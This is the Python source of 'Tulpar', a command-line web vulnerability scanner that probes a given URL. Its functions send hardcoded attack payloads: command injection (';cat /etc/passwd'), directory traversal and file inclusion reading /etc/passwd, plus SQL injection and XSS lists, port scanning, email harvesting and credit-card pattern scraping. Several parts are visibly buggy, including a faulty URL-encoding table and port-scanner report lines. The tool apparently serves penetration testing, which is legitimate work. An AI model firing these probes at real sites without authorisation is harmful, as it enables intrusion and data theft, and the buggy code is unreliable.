# -*- coding: utf-8 -*-
__author__="Anil Baran Yelken"
import argparse
import re
import requests
import whois
import ssl
import socket
from lxml import html
import telnetlib
import cyberthreat
desc="""Tulpar - Web Vulnerability Scanner\n
0100000101110101011101000110100001101111011100100011101000100000010000010110111001101001011011000010
0000010000100110000101110010011000010110111000100000010110010110010101101100011010110110010101101110
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111110111111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111110011111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111001111111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111000011111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111100000111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111110000111111111111111111111111111111111111111111111111111111111111111111111111
1111111111111111111111111000011111111111011111111111111111111111111111111111111111111111111111111111
1111111111111101111011111100000111111111001111111111111111111111111111111111111111111111111111111111
1111111111111110011111111111000000111111001111111111111111111111111111111111111111111111111111111111
1111111111111111011110000010000000000111111111111111111111111111111111111111111111111111111111111111
1111111111111111100111000000000111100011111111111111111111111111111111111111111111111111111111111111
1111111000011111111101100100000000010011111111111111111111111111111111111111111111111111111111111111
1111111100001111111111111110000010010000000111111111111111111111111111111111111111111111111111111111
1111111110000111111111000111100000000000000011111111111111111111111111111111111111111111111111111111
1111111111000000011100000111000000000000000011111111111111111111111111111111111111111111111111111111
1111111111110001101111000010000000000000000011111111111111111111111111111111111111111111111111111111
1111111111111101011111110000010000000000000111001111111111111111111111111111111111111111111111111111
1111111111111111011111111100000011000000000000000011111111111111111111111111111111111111111111111111
1111111111111111110011111110000000000000000000000000011111111111111111111111111111111111111111111111
1111111111111111111001111111111000000000000000000000001111111111111110111111111111111111111111111111
1111111111111111111111011111111000000000000000000000000011111111111100001111111101111111111111111111
1111111111111111111111100011011100000000000000000000000001111111100000000110111011111111111111111111
1111111111111111111111111111100100000000000000000000000001111101000000000010011111111111111111111111
1111111111111111111111111111110001000000000000000000000001111000000000000000001111111111111111111111
1111111111111111111111111111110000000000000000000000000011111110000000000000011111111111111111111111
1111111111111111111111011111111000000000000000000000000111110000000000000000011111111111111111111111
1111111111111111111111111111000000000000000000000000001111100000000000000000011111111111111111111111
1111111111111111111111111111110000001100000000000000001111000000000000000000011111111111111111111111
1111111111111111111111111111111000000000000000000000000110000000000000000000001111111111111111111111
1111111111111111111111111111111100000000000000000000000110000000000000000000000111111111111111111111
1111111111111111111111111111111100000000000000000000000110000000000000000000000111111111111111111111
1111111111111111111111111111111000000000000000000000000011000000000000001000000011111111111111111111
1111111111111111111111111111111111011010000000000000000000000000000000001111000001111111111111111111
1111111111111111111111111111111111111011000000000110000000000000000000001111110101111111111111111111
1111111111111111111111111111111111111001000000000111000000000000000000001111110111111111111111111111
1111111111111111111111111111111111110001000000000001100000000000000000000111111111111111111111111111
1111111111111111111111111111111111100001110110000000110000000000000000000111111111111111111111111111
1111111111111111111111111111111111110111111111000000010000000000000000001111111111111111111111111111
1111111111111111111111111111111111111111111111100000000000000000000000111111110000111111111111111111
1111111111111111111111111111111111111111111111100000000000000000000001111111000000111111111111111111
1111111111111111111111111111111111111111111111110000000000000000000011111000000011011111111111111111
1111111111111111111111111111111111111111111111110000000000000000000011000000000111001111111111111111
1111111111111111111111111111111111111111111111111000000000000000000000000000001111100111111111111111
1111111111111111111111111111111111111111111111111000000000000000000000000000011111110111111111111111
1111111111111111111111111111111111111111111111111000000000000000000000000001111111110111111111111111
1111111111111111111111111111111111111111111111111000000000000000000000000011111111111111111111111111
1111111111111111111111111111111111111111111111111000000000000000000000000011111110001101111111111111
1111111111111111111111111111111111111111111111111000000000000000000000000011100000001100011111111111
1111111111111111111111111111111111111111111111111000000000000000000000000011100000001111000111111111
1111111111111111111111111111111111111111111111111000000000000000000000000011000000111111110001111111
1111111111111111111111111111111111111111111111111110000000000000000000000011000111111111111000111111
1111111111111111111111111111111111111111111111111111110000000000000000000010111111111111111100111111
1111111111111111111111111111111111111111111111111111110000000000000000000011111111111111111110011111
1111111111111111111111111111111111111111111111111111000000000000000000000111111111111111111110001111
1111111111111111111111111111111111111111111111111100000000000000000000001111111111111111111111111111
1111111111111111111111111111111111111111111111100000000000000000000000011111111111111111111111111111
1111111111111111111111111111111111111111111111000000000000000000000000011111111111111111111111111111
1111111111111111111111111111111111111111111100000000000000000000000000111111111111111111111111111111
1111111111111111111111111111111111111111111000000000000000000000000111111111111111111111111111111111
1111111111111111111111111111111111111111111000000000000000000000001111111111111111111111111111111111
1111111111111111111111111111111111111111110000000000000000000000011111111111111111111111111111111111
1111111111111111111111111111111111111111000000000000000000000000011111111111111111111111111111111111
1111111111111111111111111111111111100000000000000000000000000000111111111111111111111111111111111111
1111111111111111111111111111111111000000000000000000000000000001111111111111111111111111111111111111
1111111111111111111111111111111111000000100000000000001110000011111111111111111111111111111111111111
1111111111111111111111111111111111000001100000000000100110001111111111111111111111111111111111111111
1111111111111111111111111111111111000001100000000000110010011111111111111111111111111111111111111111
1111111111111111111111111111111111000001100000000000011011111111111111111111111111111111111111111111
1111111111111111111111111111111111000001110000000000011111111111111111111111111111111111111111111111
1111111111111111111111111111111111000001111000000000011111111111111111111111111111111111111111111111
1111111111111111111111111111111111000001111000000000001111111111111111111111111111111111111111111111
1111111111111111111111111111111111000000111100000000001111111111111111111111111111111111111111111111
1111111111111111111111111111111110000000111110000000001111111111111111111111111111111111111111111111
1111111111111111111111111111111111000000111110000000000111111111111111111111111111111111111111111111
1111111111111111111111111111111111000000111111000000001111111111111111111111111111111111111111111111
1111111111111111111111111111111111100000111111100000001111111111111111111111111111111111111111111111
1111111111111111111111111111111111100000011111110000001111111111111111111111111111111111111111111111
1111111111111111111111111111111111100000011111110000001111111111111111111111111111111111111111111111
1111111111111111111111111111111111110000011111110000001111111111111111111111111111111111111111111111
1111111111111111111111111111111111110000011111110000011111111111111111111111111111111111111111111111
1111111111111111111111111111111111110000011111110000011111111111111111111111111111111111111111111111
1111111111111111111111111111111111110000001111110000011111111111111111111111111111111111111111111111
1111111111111111111111111111111111111100001111110001101111111111111111111111111111111111111111111111
1111111111111111111111111111111111111110001111110011110011111111111111111111111111111111111111111111
1111111111111111111111111111111111111110001111100011111100111111111111111111111111111111111111111111
1111111111111111111111111111111111111110001111110001111110011111111111111111111111111111111111111111
"""
parser=argparse.ArgumentParser(description=desc)
parser.add_argument("action",help="Action: full xss sql fuzzing e-mail credit-card whois links portscanner urlEncode cyberthreatintelligence commandInjection directoryTraversal fileInclude headerCheck certificate method IP2Location FileInputAvailable")
parser.add_argument("web_URL",help="URL")
args = parser.parse_args()
url=""
def whoisSorgu(url,dosyaAdi):
    query = whois.whois(url)
    print "[+]Domain: ", query.domain
    print "[+]Update time: ", query.get('updated_date')
    print "[+]Expiration time: ", query.get('expiration_date')
    print "[+]Name server: ", query.get('name_servers')
    print "[+]Email: ", query.get('emails')
    rapor = open(dosyaAdi, "a")
    raporIcerik=""
    raporIcerik+="[+]Domain: "+query.domain+"\n"
    raporIcerik+="[+]Update time: "+str(query.get('updated_date'))+"\n"
    raporIcerik+="[+]Expiration time: "+str(query.get('expiration_date'))+"\n"
    raporIcerik+="[+]Name server: "+str(query.get('name_servers'))+"\n"
    raporIcerik+="[+]Email: "+str(query.get('emails'))+"\n"
    rapor.write(raporIcerik)
    rapor.close()

def commandInjection(url,dosyaAdi):
    try:
        deger = url.find("=")
        istek = url[:deger + 1] + ";cat%20/etc/passwd"
        sonuc = requests.get(istek, verify=False)
        if "www-data" in sonuc.content:
            print "[+]Command injection possible, payload: ;cat%20/etc/passwd"
            print "Response: ", sonuc.content
            rapor = open(dosyaAdi, "a")
            raporIcerik="[+]Command injection possible, payload: ;cat%20/etc/passwd\n"
            raporIcerik += "Response: " + sonuc.content + "\n"
            rapor.write(raporIcerik)
            rapor.close()
        else:
            print "[-]Command injection isn't possible, payload: ;cat%20/etc/passwd"
            print "Response: ", sonuc.content
            rapor = open(dosyaAdi, "a")
            raporIcerik="[-]Command injection isn't possible, payload: ;cat%20/etc/passwd\n"
            raporIcerik += "Response: " + sonuc.content + "\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        pass

def directoryTraversal(url,dosyaAdi):
    try:
        deger = url.find("=")
        istek = url[:deger + 1] + "../../../../../../etc/passwd"
        sonuc = requests.get(istek, verify=False)
        if "www-data" in sonuc.content:
            print "[+]Directory traversal possible, payload: ../../../../../../etc/passwd"
            print "Response: ",sonuc.content
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Directory traversal possible, payload: ../../../../../../etc/passwd\n"
            raporIcerik+= "Response: "+sonuc.content+"\n"
            rapor.write(raporIcerik)
            rapor.close()
        else:
            print "[-]Directory traversal isn't possible, payload: ../../../../../../etc/passwd"
            print "Response: ",sonuc.content
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[-]Directory traversal isn't possible, payload: ../../../../../../etc/passwd\n"
            raporIcerik+= "Response: "+sonuc.content+"\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        pass

def fileInclude(url,dosyaAdi):
    try:
        deger = url.find("=")
        istek = url[:deger + 1] + "../../../../../../etc/passwd"
        sonuc = requests.get(istek, verify=False)
        if "www-data" in sonuc.content:
            print "[+]File include possible, payload: ../../../../../../etc/passwd"
            print "Response: ",sonuc.content
            rapor = open(dosyaAdi, "a")
            raporIcerik="[+]File include possible, payload: ../../../../../../etc/passwd\n"
            raporIcerik+="Response: "+sonuc.content+"\n"
            rapor.write(raporIcerik)
            rapor.close()
        else:
            print "[-]File include isn't possible, payload: ../../../../../../etc/passwd"
            print "Response: ",sonuc.content
            rapor = open(dosyaAdi, "a")
            raporIcerik="[-]File include isn't possible, payload: ../../../../../../etc/passwd\n"
            raporIcerik+="Response: "+sonuc.content+"\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        pass

def headerInformation(url,dosyaAdi):
    sonuc = requests.get(url, verify=False)
    raporIcerik=""
    print "[+]Server: ", sonuc.headers['Server']
    print "[+]Technology: ", sonuc.headers['X-Powered-By']
    try:
        contenttype = sonuc.headers['X-Content-Type']
        if contenttype:
            print "[+]X-Content-Type available"
            raporIcerik="[+]X-Content-Type available\n"
        else:
            print "[-]X-Content-Type isn't available"
            raporIcerik="[-]X-Content-Type isn't available\n"
        if "nosniff" in contenttype:
            print "[+]X-Content-type is secure"
            raporIcerik+="[+]X-Content-type is secure\n"
        else:
            print "[-]X-Content-type is not secure"
            raporIcerik+="[-]X-Content-type is not secure\n"
    except:
        pass
    try:
        if sonuc.headers['X-XSS-Protection'] == "0":
            print "[+]No XSS protection"
            raporIcerik+="[+]No XSS protection\n"
        elif sonuc.headers['X-XSS-Protection'] == "1":
            print "[-]XSS protection possible"
            raporIcerik+="[-]XSS protection possible\n"
    except:
        pass
    rapor = open(dosyaAdi, "a")
    rapor.write(raporIcerik)
    rapor.close()

def portScanner(url,dosyaAdi):
    raporIcerik=""
    baslangic=int(raw_input("Start port: "))
    bitis=int(raw_input("Finish port: "))
    for port in range(baslangic, bitis, 1):
        try:
            i=str(port)
            baglanti = telnetlib.Telnet(url, i)
            baglanti.write("\n")
            print "[+]", str(port), " - ", baglanti.read_all().splitlines()[0]
            raporIcerik+="[+]", str(port), " - ", baglanti.read_all().splitlines()[0]+"\n"
            baglanti.close()
        except:
            pass

    rapor = open(dosyaAdi, "a")
    rapor.write(raporIcerik)
    rapor.close()

def robotstxtAvailable(url,dosyaAdi):
    url += "/robots.txt"
    try:
        sonuc = requests.get(url, verify=False)
        if int(sonuc.status_code) == 200:
            print "[+]robots.txt available"
            print "robots.txt:", sonuc.content
            raporIcerik="[+]robots.txt available\n"
            raporIcerik+="robots.txt:"+sonuc.content+"\n"
            rapor = open(dosyaAdi, "a")
            rapor.write(raporIcerik)
            rapor.close()
    except:
        print "[-]robots.txt isn't available"
        print "robots.txt:", sonuc.content
        raporIcerik = "[-]robots.txt isn't available\n"
        rapor = open(dosyaAdi, "a")
        rapor.write(raporIcerik)
        rapor.close()

def urlEncode(url,dosyaAdi):
    sozluk = {" ": "%20", "!": "%21", "#": "%23", "$": "%24", "%": "%25", "&": "%26", "'": "%27", "(": "%28",
              ")": "%29", "*": "%30", "+": "%2B", ",": "%2C",
              "-": "%2D", ".": "%2E", "/": "%2F", "0": "%30", "1": "%31", "2": "%32", "3": "%33", "4": "%34",
              "5": "%35", "6": "%36", "7": "%37", "8": "%38",
              "9": "%39", ":": "%3A", ";": "%3B", "<": "%3C", "=": "%3D", ">": "%3E", "?": "%3F", "@": "%40",
              "A": "%41", "B": "%42", "C": "%43", "D": "%44",
              "E": "%45", "F": "%46", "G": "%47", "H": "%48", "I": "%49", "J": "%4A", "K": "%4B", "L": "%4C",
              "M": "%4D", "N": "%4E", "O": "%4F", "P": "%50",
              "Q": "%51", "R": "%52", "S": "%53", "T": "%54", "U": "%55", "V": "%56", "W": "%57", "X": "%58",
              "Y": "%59", "Z": "%5A", "[": "%5B", "]": "%5D",
              "^": "%5E", "_": "%5F", "`": "%60", "a": "%61", "b": "%62", "c": "%63", "d": "%64", "e": "%65",
              "f": "%66", "g": "%67", "h": "%68", "i": "%69",
              "j": "%6A", "k": "%6B", "l": "%6C", "m": "%6D", "n": "%6E", "o": "%6F", "p": "%70", "q": "%71",
              "r": "%72", "s": "%73", "t": "%74", "u": "%75",
              "v": "%76", "w": "%77", "y": "%78", "z": "%7A", "{": "%7B", "|": "%7C", "}": "%7D", "~": "%7E"}
    encodeURL = ""
    for i in url:
        encodeURL += sozluk[i]
    print "[+]Encoded URL:",encodeURL
    raporIcerik="[+]Encoded URL:"+encodeURL+"\n"
    rapor = open(dosyaAdi, "a")
    rapor.write(raporIcerik)
    rapor.close()

def certificateInformation(url,dosyaAdi):
    try:
        context = ssl.create_default_context()
        server = context.wrap_socket(socket.socket(), server_hostname=url)
        server.connect((url, 443))
        certificate = server.getpeercert()
        print "[+]Certificate Serial Number: ",certificate.get('serialNumber')
        print "[+]Certificate SSL Version:", certificate.get('version')
        print "[+]Certificate:",certificate
        raporIcerik="[+]Certificate Serial Number: "+str(certificate.get('serialNumber'))+"\n"
        raporIcerik+="[+]Certificate SSL Version:"+str(certificate.get('version'))+"\n"
        raporIcerik+="[+]Certificate:"+str(certificate)+"\n"
        rapor = open(dosyaAdi, "a")
        rapor.write(raporIcerik)
        rapor.close()
    except:
        pass


def cyberthreatintelligence(url,dosyaAdi):
    cyberthreat.cyberThreatIntelligence(url, dosyaAdi)

def method(url,dosyaAdi):
    try:
        telnetBaglanti = telnetlib.Telnet(url, 80)
        telnetBaglanti.write("OPTIONS / HTTP/1.1\n")
        komut = "Host: " + url + "\n\n\n\n"
        telnetBaglanti.write(komut)
        sayfa = telnetBaglanti.read_all()
        deger = str(sayfa).find("Allow")
        deger2 = str(sayfa).find("\n", deger + 1)
        Metodlar = sayfa[deger:deger2]
        print "Methods: ", Metodlar
        raporIcerik="[+]Methods: "+Metodlar+"\n"
        rapor = open(dosyaAdi, "a")
        rapor.write(raporIcerik)
        rapor.close()
    except:
        pass

def IP2Location(url,dosyaAdi):
    adres = "http://ip-api.com/json/"+url
    try:
        sonuc = requests.get(adres, verify=False)
        print "City: ", sonuc.content['city']
        print "Country: ", sonuc.content['country']
        print "Time Zone: ", sonuc.content['timezone']
        raporIcerik="[+]City: "+sonuc.content['city']+"\n"
        raporIcerik+= "[+]Country: " + sonuc.content['country'] + "\n"
        raporIcerik += "[+]Time Zone: " + sonuc.content['timezone'] + "\n"
        rapor = open(dosyaAdi, "a")
        rapor.write(raporIcerik)
        rapor.close()
    except:
        pass

def FileInputAvailable(url,dosyaAdi):
    page = requests.get(url, verify=False)
    tree = html.fromstring(page.content)
    inputs = tree.xpath('//input[@name]')
    for input in inputs:
        startPoint = int(str(input).find("'")) + 1
        stopPoint = int(str(input).find("'", startPoint))
        print str(input)[startPoint:stopPoint]
        if "type='file'" in input:
            print "[+]File Upload Function available"
            rapor = open(dosyaAdi, "a")
            rapor.write("[+]File Upload Function available\n")
            rapor.close()

def sql(url,dosyaAdi):
    sqlDosya = open("sqlpayload.txt", "r")
    sqlPayload = sqlDosya.readlines()
    sqlDosya.close()
    if "=" in url:
        deger = str(url).find('=')
        for i in sqlPayload:
            try:
                i = i.split("\n")[0]
                yazi = str(url[0:deger + 1]) + str(i)
                sonuc = requests.get(yazi)
                if int(sonuc.status_code)==200:
                    print "[+]Sqli paylaod: ", str(i)
                    print "[+]Sqli URL: ", yazi
                    rapor=open(dosyaAdi,"a")
                    raporIcerik="[+]Sqli paylaod: "+str(i)+"\n"
                    raporIcerik+="[+]Sqli URL: "+yazi+"\n"
                    rapor.write(raporIcerik)
                    rapor.close()
                else:
                    print "[-]Sqli paylaod: ", str(i)
                    print "[-]Sqli URL: ", yazi
                    rapor=open(dosyaAdi,"a")
                    raporIcerik="[-]Sqli paylaod: "+str(i)+"\n"
                    raporIcerik+="[-]Sqli URL: "+yazi+"\n"
                    rapor.write(raporIcerik)
                    rapor.close()
            except:
                pass
    else:
        print "[-]Sqli isn't available"
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]Sqli isn't available\n"
        rapor.write(raporIcerik)
        rapor.close()
def xss(url,dosyaAdi):
    xssDosya = open("xsspayload.txt", "r")
    xssPayload = xssDosya.readlines()
    xssDosya.close()
    esittirIndis = url.find("=")
    if "=" in url:
        for i in xssPayload:
            try:
                i = i.split("\n")[0]
                istek = str(url[:esittirIndis + 1]) + str(i)
                icerik = requests.get(istek)
                if i in icerik.content:
                    print "[+]XSS payload: ", str(i)
                    print "[+]XSS URL: ", istek
                    rapor=open(dosyaAdi,"a")
                    raporIcerik="[+]XSS paylaod: "+str(i)+"\n"
                    raporIcerik+="[+]XSS URL: "+istek+"\n"
                    rapor.write(raporIcerik)
                    rapor.close()
                else:
                    print "[-]XSS payload: ", str(i)
                    print "[-]XSS URL: ", istek
                    rapor=open(dosyaAdi,"a")
                    raporIcerik="[-]XSS paylaod: "+str(i)+"\n"
                    raporIcerik+="[-]XSS URL: "+istek+"\n"
                    rapor.write(raporIcerik)
                    rapor.close()
            except:
                pass
    else:
        print "[-]XSS isn't available"
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]XSS isn't available\n"
        rapor.write(raporIcerik)
        rapor.close()
def crawl(url,dosyaAdi):
    crawlDosya = open("crawl.txt", "r")
    crawlIcerik = crawlDosya.readlines()
    crawlDosya.close()
    for i in crawlIcerik:
        try:
            i = i.split("\n")[0]
            crawlSite = url + str(i)
            istek = requests.get(crawlSite, verify=False)
            if str(istek.status_code) == "200":
                print "[+]Url: ", crawlSite
                rapor = open(dosyaAdi, "a")
                raporIcerik = "[+]Url: "+crawlSite+"\n"
                rapor.write(raporIcerik)
                rapor.close()
            else:
                print "[-]Url: ", crawlSite
                rapor = open(dosyaAdi, "a")
                raporIcerik = "[-]Url: "+crawlSite+"\n"
                rapor.write(raporIcerik)
                rapor.close()
        except:
            pass

def mail(url,dosyaAdi):
    istek = requests.get(url, verify=False)
    sonuc = re.findall(r'[\w.-]+@[\w.-]+.\w+', istek.content)
    for i in sonuc:
        print "[+]E-mail: ", str(i)
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[+]E-mail: "+str(i)+"\n"
        rapor.write(raporIcerik)
        rapor.close()

def credit(url,dosyaAdi):
    istek = requests.get(url, verify=False)
    icerik = str(istek).split()
    icerikSon = str("".join(icerik))
    AMEX = re.match(r"^3[47][0-9]{13}$", icerikSon)
    VISA = re.match(r"^4[0-9]{12}(?:[0-9]{3})?$", icerikSon)
    MASTERCARD = re.match(r"^5[1-5][0-9]{14}$", icerikSon)
    DISCOVER = re.match(r"^6(?:011|5[0-9]{2})[0-9]{12}$", icerikSon)
    try:
        if MASTERCARD.group():
            print "[+]Website has a Master Card!"
            print MASTERCARD.group()
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Website has a Master Card!\n"
            raporIcerik += MASTERCARD.group()+"\n"
            rapor.write(raporIcerik)
            rapor.close()

    except:
        print "[-]Website hasn't a Mastercard!"
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]Website hasn't MasterCard!\n"
        rapor.write(raporIcerik)
        rapor.close()
    try:
        if VISA.group():
            print "[+]Website has a VISA card!"
            print VISA.group()
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Website has a VISA card!\n"
            raporIcerik += VISA.group()+"\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        print "[-]Website hasn't a VISA card!"
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]Website hasn't a VISA card!\n"
        rapor.write(raporIcerik)
        rapor.close()
    try:
        if AMEX.group():
            print "[+]Website has a AMEX card!"
            print AMEX.group()
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Website has a AMEX card!\n"
            raporIcerik += AMEX.group()+"\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        print "[-]Website hasn't a AMEX card!"
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]Website hasn't a AMEX card!\n"
        rapor.write(raporIcerik)
        rapor.close()
    try:
        if DISCOVER.group():
            print "[+]Website has a DISCOVER card!"
            print DISCOVER.group()
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Website has a DISCOVER card!\n"
            raporIcerik += DISCOVER.group()+"\n"
            rapor.write(raporIcerik)
            rapor.close()
    except:
        print "[-]Website hasn't a DISCOVER card!"
        rapor = open(dosyaAdi, "a")
        raporIcerik = "[-]Website hasn't a DISCOVER card!\n"
        rapor.write(raporIcerik)
        rapor.close()
def link(url,dosyaAdi):
    isimSayi1 = url.find(".")
    isim = url[isimSayi1 + 1:]
    isimSayi2 = isim.find(".")
    isim = isim[:isimSayi2]
    istek = requests.get(url, verify=False)
    sonuc = re.findall(
        r"""(?i)\b((?:https?:(?:/{1,3}|[a-z0-9%])|[a-z0-9.\-]+[.](?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)/)(?:[^\s()<>{}\[\]]+|\([^\s()]*?\([^\s()]+\)[^\s()]*?\)|\([^\s]+?\))+(?:\([^\s()]*?\([^\s()]+\)[^\s()]*?\)|\([^\s]+?\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’])|(?:(?<!@)[a-z0-9]+(?:[.\-][a-z0-9]+)*[.](?:com|net|org|edu|gov|mil|aero|asia|biz|cat|coop|info|int|jobs|mobi|museum|name|post|pro|tel|travel|xxx|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cs|cu|cv|cx|cy|cz|dd|de|dj|dk|dm|do|dz|ec|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|me|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|rs|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|Ja|sk|sl|sm|sn|so|sr|ss|st|su|sv|sx|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)\b/?(?!@)))""",
        istek.content)
    for i in sonuc:
        if isim in i:
            print "[+]Links:", i
            rapor = open(dosyaAdi, "a")
            raporIcerik = "[+]Links:"+i+"\n"
            rapor.write(raporIcerik)
            rapor.close()

if args:
    url = getattr(args, 'web_URL')
    print str(url).split("/")[2]
    dosyaAdi=str(url).split("/")[2]+"_rapor.txt"
    rapor=open(dosyaAdi,"a")
    raporIcerik=url+"\n"
    rapor.write(raporIcerik)
    rapor.close()
    print "[+]URL:", url, "\n=========="
    if args.action=="sql":
        sql(url,dosyaAdi)

    elif args.action=="whois":
        whoisSorgu(url,dosyaAdi)

    elif args.action=="portscanner":
        if str(url).split("/")[2]:
            url=str(url).split("/")[2]
        elif str(url).split("/")[3]:
            url = str(url).split("/")[2]

        print url
        portScanner(url,dosyaAdi)

    elif args.action=="urlEncode":
        urlEncode(url,dosyaAdi)

    elif args.action=="cyberthreatintelligence":
        cyberthreatintelligence(url,dosyaAdi)

    elif args.action=="xss":
        xss(url,dosyaAdi)

    elif args.action=="crawl":
        crawl(url,dosyaAdi)

    elif args.action=="e-mail":
        mail(url,dosyaAdi)

    elif args.action=="credit":
        credit(url,dosyaAdi)

    elif args.action=="links":
        link(url,dosyaAdi)

    elif args.action=="commandInjection":
        commandInjection(url,dosyaAdi)

    elif args.action=="directoryTraversal":
        directoryTraversal(url,dosyaAdi)

    elif args.action=="fileInclude":
        fileInclude(url,dosyaAdi)

    elif args.action=="headerCheck":
        headerInformation(url,dosyaAdi)

    elif args.action=="certificate":
        if str(url).split("/")[2]:
            url=str(url).split("/")[2]
        elif str(url).split("/")[3]:
            url = str(url).split("/")[2]

        print url
        certificateInformation(url,dosyaAdi)

    elif args.action=="method":
        if str(url).split("/")[2]:
            url=str(url).split("/")[2]
        elif str(url).split("/")[3]:
            url = str(url).split("/")[2]
        print url
        method(url,dosyaAdi)

    elif args.action=="IP2Location":
        IP2Location(url,dosyaAdi)

    elif args.action=="FileInputAvailable":
        FileInputAvailable(url,dosyaAdi)

    elif args.action=="full":
        whoisSorgu(url,dosyaAdi)
        urlEncode(url,dosyaAdi)
        method(url, dosyaAdi)
        certificateInformation(url,dosyaAdi)
        link(url,dosyaAdi)
        crawl(url,dosyaAdi)
        robotstxtAvailable(url, dosyaAdi)
        headerInformation(url,dosyaAdi)
        portScanner(url,dosyaAdi)
        mail(url,dosyaAdi)
        cyberthreatintelligence(url, dosyaAdi)
        IP2Location(url,dosyaAdi)
        FileInputAvailable(url,dosyaAdi)
        credit(url,dosyaAdi)
        sql(url,dosyaAdi)
        xss(url,dosyaAdi)
        commandInjection(url,dosyaAdi)
        directoryTraversal(url,dosyaAdi)
        fileInclude(url,dosyaAdi)


    else:
        exit()
